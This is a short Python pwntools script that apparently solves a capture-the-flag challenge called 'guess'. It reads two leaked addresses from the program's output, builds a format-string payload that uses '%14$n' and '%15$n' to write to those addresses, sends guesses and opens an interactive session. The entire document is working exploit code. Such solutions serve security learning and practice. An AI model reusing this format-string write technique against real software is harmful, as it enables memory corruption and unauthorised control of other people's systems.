from pwn import *

import re



c = remote("binary.hashbangctf.com", 6000)
c = process("./guess")


c.recvline()

c.recvline()

c.recvline()

reply = c.recvline()

print(reply)

address = re.search('0x(.......)', reply)

addr1 = "0x0" + address.group(0)[2:]

address = re.search('and 0x(.......)', reply)

addr2 = "0x0" + address.group(0)[6:]

print(addr1, addr2)

addr1 = int(addr1, 0)

addr2 = int(addr2, 0)



payload = p32(addr1)

payload += p32(addr2)

payload += "%14$n"

payload += "%15$n"



c.sendline(payload)

c.sendline("8")

c.sendline("8")

c.interactive()
